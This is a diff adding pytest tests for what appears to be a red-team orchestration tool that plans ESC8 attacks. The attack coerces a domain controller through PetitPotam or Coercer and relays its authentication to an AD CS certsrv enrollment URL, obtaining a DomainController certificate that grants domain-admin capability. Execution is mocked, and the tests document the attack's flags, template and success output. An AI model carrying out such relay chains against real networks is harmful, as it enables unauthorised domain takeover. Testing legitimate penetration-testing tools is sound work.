@@ -317,3 +317,62 @@ def test_relay_victim_prompt_accepts_literal_host(monkeypatch):
     monkeypatch.setattr("builtins.input", lambda _prompt="": "10.9.9.9")
     victim = console._prompt_relay_victim()
     assert victim == "10.9.9.9"
+
+
+# --- ESC8 (relay to AD CS web enrollment) ----------------------------------
+
+def test_build_esc8_plan_from_bare_ca_host():
+    orch = _orch(FakeRunner(FakeBackground([])))
+    plan = orch.build_plan(
+        RelayMode.ADCS_ESC8, CoercionMethod.PETITPOTAM,
+        listener_ip="10.0.0.5", relay_target="ca01.corp.local", victim="10.0.0.10",
+        domain="corp.local", username="alice", password="pw",
+    )
+    # Bare host is turned into the certsrv web-enrollment URL.
+    assert "http://ca01.corp.local/certsrv/certfnsh.asp" in plan.relay_argv
+    assert "--adcs" in plan.relay_argv
+    assert "--template" in plan.relay_argv
+    assert "DomainController" in plan.relay_argv
+    assert plan.mode.grants is Capability.CERT_AS_DA
+
+
+def test_build_esc8_plan_passes_through_full_url():
+    orch = _orch(FakeRunner(FakeBackground([])))
+    plan = orch.build_plan(
+        RelayMode.ADCS_ESC8, CoercionMethod.COERCER,
+        listener_ip="10.0.0.5",
+        relay_target="https://ca01/certsrv/certfnsh.asp",
+        victim="10.0.0.10", domain="corp.local", username="alice", password="pw",
+    )
+    assert "https://ca01/certsrv/certfnsh.asp" in plan.relay_argv
+
+
+def test_esc8_requires_relay_target():
+    orch = _orch(FakeRunner(FakeBackground([])))
+    with pytest.raises(RelayError) as exc:
+        orch.build_plan(
+            RelayMode.ADCS_ESC8, CoercionMethod.COERCER,
+            listener_ip="10.0.0.5", relay_target=None, victim="10.0.0.10",
+            domain="corp.local", username="alice", password="pw",
+        )
+    assert "CA" in str(exc.value)
+
+
+def test_esc8_run_detects_certificate_and_grants_cert_as_da():
+    bg = FakeBackground([
+        "Setting up HTTP Server",
+        "Servers started, waiting for connections",
+        "Authenticating against http://ca01 as CORP/DC01$",
+        "GOT CERTIFICATE! ID 42",
+    ])
+    runner = FakeRunner(bg)
+    orch = _orch(runner)
+    plan = orch.build_plan(
+        RelayMode.ADCS_ESC8, CoercionMethod.PETITPOTAM,
+        listener_ip="10.0.0.5", relay_target="ca01.corp.local", victim="10.0.0.10",
+        domain="corp.local", username="alice", password="pw",
+    )
+    result = orch.run(plan)
+    assert result.success
+    assert result.capability is Capability.CERT_AS_DA
+    assert bg.stopped
